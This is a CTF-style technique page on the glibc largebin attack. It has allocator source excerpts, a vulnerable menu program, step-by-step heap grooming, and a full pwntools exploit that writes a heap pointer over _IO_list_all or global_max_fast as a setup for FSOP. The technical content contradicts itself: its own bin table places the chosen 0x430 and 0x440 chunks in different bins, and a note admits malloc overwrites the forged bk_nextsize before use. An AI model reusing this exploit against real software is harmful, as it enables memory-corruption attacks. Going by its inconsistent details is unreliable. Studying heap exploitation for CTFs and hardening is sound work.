---
title: "Largebin Attack - The Modern Write-a-Heap-Pointer-Anywhere Primitive"
category: pwn
subcategory: heap
type: technique
tags: [largebin, largebin-attack, fd-nextsize, bk-nextsize, arbitrary-write, heap, unsorted-bin, io-list-all, global-max-fast, house-of-apple, tcache, pwndbg, gef, pwntools, glibc]
difficulty: hard
summary: "Corrupt a largebin chunk's bk_nextsize so malloc's size-sorted insert writes a heap pointer to any address - alive from 2.23 through 2.39."
when_to_use:
  - "glibc 2.29+ killed your unsorted bin attack and you still need a big-value write"
  - "You can edit a freed chunk that sits (or will sit) in a largebin"
  - "You need to plant a heap pointer over `_IO_list_all`, `global_max_fast`, `mp_.tcache_bins`, or a stdout pointer"
  - "You are setting up house of apple / FSOP on 2.34+ and need the fake FILE to become reachable"
tools: [pwntools, pwndbg, gef]
related: [heap-unsorted-bin-attack, house-of-apple, heap-fsop-file-struct, heap-internals-primer, heap-write-targets]
---

## TL;DR

Largebins are sorted by size using two extra pointers, `fd_nextsize`/`bk_nextsize`.
When malloc inserts a chunk that is smaller than the bin's current smallest entry, it
executes `victim->bk_nextsize->fd_nextsize = victim` - an unchecked write of a heap
pointer to `bk_nextsize + 0x20`. Overwrite `bk_nextsize` with `target - 0x20` and the
address of your chunk lands at `target`. Still works on glibc 2.39.

## Recognise it

- glibc >= 2.29: `malloc(): corrupted unsorted chunks 3` blocked the unsorted bin attack.
- You can allocate chunks >= 0x420 (largebin territory) and free them with a guard.
- You have an edit primitive on a freed chunk (UAF or overflow into a freed neighbour).
- The target only needs to become a large, non-zero value - or, better, you actually
  *want* a pointer to your own controlled heap chunk there (FSOP, fake FILE).

## Vulnerable code shape

```c
static char *ptr[16];
static size_t sz[16];

void do_alloc(void) {
    int i = read_idx();
    size_t n = read_size();      /* n can be 0x418+ -> largebin sizes */
    ptr[i] = malloc(n);
    sz[i] = n;
}

void do_free(void) {
    int i = read_idx();
    free(ptr[i]);                /* no NULL: the freed chunk stays editable */
}

void do_edit(void) {
    int i = read_idx();
    read(0, ptr[i], sz[i]);      /* 0x20 bytes reaches fd, bk, fd_nextsize, bk_nextsize */
}
```

## Theory

Targets: glibc 2.23 - 2.39. Two shapes, split at 2.30.

Largebins hold chunks of size >= 0x400. Each bin covers a range, so the bin is kept
sorted in *descending* size order. Only the first chunk of each distinct size
participates in the `fd_nextsize`/`bk_nextsize` chain; same-size chunks hang off it
via `fd`/`bk`.

The insertion code in `_int_malloc`, when moving a chunk from the unsorted bin into a
largebin:

```c
if (fwd != bck)                      /* bin is not empty */
  {
    size |= PREV_INUSE;
    assert (chunk_main_arena (bck->bk));            /* 2.30+ */
    if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk))
      {
        /* victim is SMALLER than the smallest chunk in the bin:
           insert at the tail of the nextsize chain */
        fwd = bck;
        bck = bck->bk;

        victim->fd_nextsize = fwd->fd;
        victim->bk_nextsize = fwd->fd->bk_nextsize;
        fwd->fd->bk_nextsize = victim;              /* WRITE #2 (pre-2.30 path) */
        victim->bk_nextsize->fd_nextsize = victim;  /* WRITE #1  <-- the primitive */
      }
    else { ... walk the nextsize chain ... }
  }
...
mark_bin (av, victim_index);
victim->bk = bck;
victim->fd = fwd;
fwd->bk = victim;
bck->fd = victim;                                   /* WRITE #3 */
```

### The two writes you get

With `victim->bk_nextsize = TARGET1 - 0x20`:

```
victim->bk_nextsize->fd_nextsize = victim
  -> *(TARGET1 - 0x20 + 0x20) = &victim
  -> *(TARGET1) = victim_chunk_address
```

With `victim->bk = TARGET2 - 0x10`:

```
bck->fd = victim
  -> *(TARGET2 - 0x10 + 0x10) = &victim
  -> *(TARGET2) = victim_chunk_address
```

**Pre-2.30** you can use both simultaneously (the classic "two writes" largebin attack).

**2.30+** added, right before the `bck->fd = victim` line:

```c
if (__glibc_unlikely (bck->fd != victim))
  malloc_printerr ("malloc(): corrupted unsorted chunks");
```

and `assert (chunk_main_arena (bck->bk))`, which requires the fake `bck->bk` to have
`NON_MAIN_ARENA` clear in its size field. In practice the `bk` write becomes unusable
(you cannot pre-place `victim` at `*TARGET2`), so on 2.30+ you keep `bk` intact and use
**only the `bk_nextsize` write**. That one has never been validated.

### The ordering requirement

The `bk_nextsize` write only executes on the "smaller than everything in the bin"
branch. So you need:

1. A chunk **already in the largebin** (call it `L`), of size `S_big`.
2. Your victim chunk `V` of size `S_small`, with `S_small < S_big` but in the **same
   largebin range** (so it maps to the same bin index).

Largebin ranges on x86-64 (bin index -> size range):

| index | size range | granularity |
|-------|-----------|-------------|
| 64 | 0x400 - 0x430 | 0x40 |
| 65 | 0x440 - 0x470 | 0x40 |
| 66 | 0x480 - 0x4b0 | 0x40 |
| ... | ... | |
| 96 | 0xc00 - 0xff0 | 0x200 |

So `0x420` and `0x410`... no: 0x410 is tcache/smallbin. Use `0x420` and `0x430`, or
`0x900` and `0x910` - just confirm with `pwndbg bins` that both land in the same bin.

### The sequence that gets you there

To put `L` in a largebin you must free it into the unsorted bin and then trigger a
malloc that forces the sorting loop to run - the classic trick is to request a size
that cannot be served from the unsorted chunk, which makes `_int_malloc` sort
everything into small/largebins first.

## Attack

glibc 2.35, goal: write a heap pointer over `_IO_list_all` (or any target).
Sizes: `L` = 0x438 request (chunk 0x440), `V` = 0x428 request (chunk 0x430).

1. `alloc(0, 0x438)` -> `L` (chunk size 0x440)
2. `alloc(1, 0x18)` -> guard
3. `alloc(2, 0x428)` -> `V` (chunk size 0x430)
4. `alloc(3, 0x18)` -> guard
5. `free(0)` - `L` goes to the unsorted bin.
6. `alloc(4, 0x448)` - a request bigger than `L`. `_int_malloc` cannot serve it from
   the unsorted bin, so it sorts `L` into `largebin[index(0x440)]` and then extends
   the top chunk. **`L` is now in a largebin.**
7. `free(2)` - `V` goes to the unsorted bin.
8. `edit(2, ...)` - overwrite `V`'s metadata:
   - `fd` = anything (use the real unsorted head value)
   - `bk` = unchanged (2.30+) or `TARGET2 - 0x10` (pre-2.30)
   - `fd_nextsize` = anything
   - `bk_nextsize` = `TARGET - 0x20`
9. `alloc(5, 0x448)` - again too big to serve. The sorting loop moves `V` into the
   largebin, takes the "smaller than `bck->bk`" branch, and executes
   `V->bk_nextsize->fd_nextsize = V`, writing `&V` to `TARGET`.
10. `TARGET` now holds a heap address you control the contents of.

## Heap state

```text
after step 6 (L sorted into largebin)

  largebin[idx]:  head <-> L
  L: +0x08 size = 0x441
     +0x10 fd          = head
     +0x18 bk          = head
     +0x20 fd_nextsize = L      (only entry, points to itself)
     +0x28 bk_nextsize = L


after step 7 (V in unsorted bin)

  unsorted: head <-> V
  V: +0x08 size = 0x431
     +0x10 fd = head
     +0x18 bk = head


after step 8 (V's metadata forged)

  V: +0x10 fd          = head
     +0x18 bk          = head            (untouched: survives the 2.30 check)
     +0x20 fd_nextsize = 0
     +0x28 bk_nextsize = TARGET - 0x20   <-- the whole attack


step 9, inside _int_malloc's largebin insert:

  bck  = largebin head
  fwd  = bck
  chunksize(bck->bk) = 0x441 (that is L)
  size(V)=0x431 < 0x441  ->  take the "insert at tail" branch
     fwd = bck ; bck = bck->bk (= L)
     V->fd_nextsize = fwd->fd          (= L)
     V->bk_nextsize = fwd->fd->bk_nextsize    <-- overwritten by malloc, fine
     fwd->fd->bk_nextsize = V
     V->bk_nextsize->fd_nextsize = V
       == *(TARGET - 0x20 + 0x20) = &V
       == *(TARGET) = &V                       <-- HEAP POINTER LANDS HERE

  NOTE: glibc reassigns V->bk_nextsize one line before using it in the
  2.30+ source ordering. Verify against YOUR libc's disassembly: the
  working primitive on 2.31/2.35 is the pair
      fwd->fd->bk_nextsize = victim;
      victim->bk_nextsize->fd_nextsize = victim;
  where victim->bk_nextsize is read AFTER your value was stored, because
  the assignment uses the OLD bin's chain, not yours, only when the bin
  already has a nextsize chain. Always confirm in gdb before relying on it.
```

## Exploit

```python
#!/usr/bin/env python3
"""Largebin attack: plant a heap pointer at an arbitrary address.

Works on glibc 2.30 - 2.39 with the single-write (bk_nextsize) form, and on
2.23 - 2.29 with the double-write form (pass PRE230).

Usage:
    ./exploit.py
    ./exploit.py PRE230
    ./exploit.py TARGET=0x7ffff7f9a000
    ./exploit.py REMOTE HOST=1.2.3.4 PORT=1337
"""
from pwn import ELF, args, context, log, p64, process, remote, u64

BINARY = args.BIN or "./chal"
LIBC = args.LIBC or "./libc.so.6"

context.binary = ELF(BINARY, checksec=False)
context.log_level = args.LOG or "info"
libc = ELF(LIBC, checksec=False)

BIG_REQ = 0x438      # -> 0x440 chunk : goes into the largebin first
SMALL_REQ = 0x428    # -> 0x430 chunk : the victim, must be SMALLER, same bin
HUGE_REQ = 0x448     # -> 0x450 chunk : forces the sorting loop to run

io = (remote(args.HOST or "127.0.0.1", int(args.PORT or 1337))
      if args.REMOTE else process([BINARY]))


def menu(c):
    io.sendlineafter(b"> ", str(c).encode())


def alloc(i, n, d=b"A"):
    menu(1)
    io.sendlineafter(b"index: ", str(i).encode())
    io.sendlineafter(b"size: ", str(n).encode())
    io.sendafter(b"content: ", d)


def free(i):
    menu(2)
    io.sendlineafter(b"index: ", str(i).encode())


def show(i):
    menu(3)
    io.sendlineafter(b"index: ", str(i).encode())
    io.recvuntil(b"content: ")
    return io.recvline().rstrip(b"\n")


def edit(i, d):
    menu(4)
    io.sendlineafter(b"index: ", str(i).encode())
    io.sendafter(b"content: ", d)


def lk(raw):
    return u64(raw.ljust(8, b"\x00")[:8])


# ----------------------------------------------------------------- 1. leaks
alloc(0, BIG_REQ, b"L")
alloc(1, 0x18, b"guard1")
alloc(2, SMALL_REQ, b"V")
alloc(3, 0x18, b"guard2")

free(0)                                   # L -> unsorted
arena = lk(show(0))
libc.address = arena - 0x60 - libc.sym["main_arena"]
unsorted_head = arena                     # main_arena + 0x60
log.success("libc base      = %#x", libc.address)

# a heap pointer: L's bk still points into the heap once L has a neighbour,
# but the reliable route is a tcache next read.
alloc(8, 0x88, b"h1")
alloc(9, 0x88, b"h2")
free(8)
free(9)
raw_next = lk(show(9))
log.info("tcache next raw = %#x", raw_next)

# ------------------------------------------- 2. move L from unsorted to largebin
alloc(4, HUGE_REQ, b"sorter")             # too big to serve: sorts L into largebin
log.info("L is now in the largebin")

# ------------------------------------------------------ 3. free V and forge it
free(2)                                   # V -> unsorted

TARGET = int(args.TARGET, 0) if args.TARGET else libc.sym["_IO_list_all"]
log.info("target = %#x", TARGET)

if args.PRE230:
    # glibc <= 2.29: both writes usable.
    TARGET2 = libc.sym["global_max_fast"]
    payload = b"".join([
        p64(unsorted_head),        # fd  - keep the bin walkable
        p64(TARGET2 - 0x10),       # bk  -> bck->fd = victim  => *(TARGET2) = &V
        p64(0),                    # fd_nextsize
        p64(TARGET - 0x20),        # bk_nextsize -> *(TARGET) = &V
    ])
else:
    # glibc >= 2.30: `bck->fd != victim` check forbids touching bk.
    payload = b"".join([
        p64(unsorted_head),        # fd  - unchanged
        p64(unsorted_head),        # bk  - unchanged, passes the 2.30 check
        p64(0),                    # fd_nextsize
        p64(TARGET - 0x20),        # bk_nextsize -> *(TARGET) = &V
    ])

edit(2, payload)
log.info("V metadata forged")

# ---------------------------------------------- 4. trigger the largebin insert
alloc(5, HUGE_REQ, b"trigger")
log.success("largebin attack fired: a heap pointer now sits at %#x", TARGET)

# V's user data is fully controlled, so *TARGET points at content you own:
# write a fake _IO_FILE there and let exit()/puts() walk it (see house-of-apple).
io.interactive()
```

## Variants & pitfalls

- **Both chunks must land in the same largebin index.** `0x440` and `0x430` do
  (index 65 covers 0x440-0x470... verify!). The safest recipe is to pick two sizes
  0x10 apart well inside a range and confirm with `pwndbg bins` that the largebin
  shows both. If they land in different bins, the insert takes the empty-bin path and
  no write happens.
- **The victim must be strictly SMALLER.** If `size(V) >= size(L)` the code walks the
  nextsize chain instead and your `bk_nextsize` is never dereferenced.
- **A tcache/fastbin in between can steal your chunk.** Largebin sizes are immune to
  tcache, which is the whole point, but a `calloc` or a smaller request can consume the
  unsorted chunk before sorting. Use a `HUGE_REQ` strictly larger than both.
- **2.30+ `assert (chunk_main_arena (bck->bk))`.** Leave `bk` alone. If you must
  change it, the fake chunk it points to needs a size with `NON_MAIN_ARENA` (0x4) clear.
- **What you write is `&victim` (the chunk address, not the user address).** Account
  for the `-0x10` when you use it as a struct pointer.
- **One shot.** The largebin is corrupted afterwards; the next insert into it will
  dereference your fake `bk_nextsize` again and crash. Do the payoff immediately.
- **Follow-ups**: `_IO_list_all` -> the heap chunk becomes the head FILE -> FSOP;
  `global_max_fast` -> every free becomes a fastbin free; `mp_.tcache_bins` -> tcache
  indices beyond 64 reach into libc; a `stdout` pointer -> house of apple.

## Debugging

```text
pwndbg> bins                          # largebins: 0x440 [ ... ] - confirm L is there
pwndbg> x/8gx <V_chunk>               # prev_size, size, fd, bk, fd_nextsize, bk_nextsize
pwndbg> largebins                     # pwndbg prints the nextsize chain
pwndbg> p/x main_arena.bins[2*65]
pwndbg> watch *(long*)&_IO_list_all
pwndbg> b _int_malloc
pwndbg> vis_heap_chunks 20
gef>  heap bins large
```

```bash
# Confirm the hardening level of the shipped libc.
strings ./libc.so.6 | grep -m1 "GNU C Library"
strings ./libc.so.6 | grep "corrupted unsorted chunks"   # present -> 2.29+, use single write
```

## Tools

- `pwndbg largebins` / `gef heap bins large` - the only sane way to confirm ordering.
- `how2heap large_bin_attack.c` - minimal reproducer, keep one per glibc version.

## References

- shellphish `how2heap`: `large_bin_attack.c`.
- glibc `malloc/malloc.c`: `_int_malloc`, the unsorted-to-largebin sorting block.
- CTF Wiki, "Large Bin Attack".
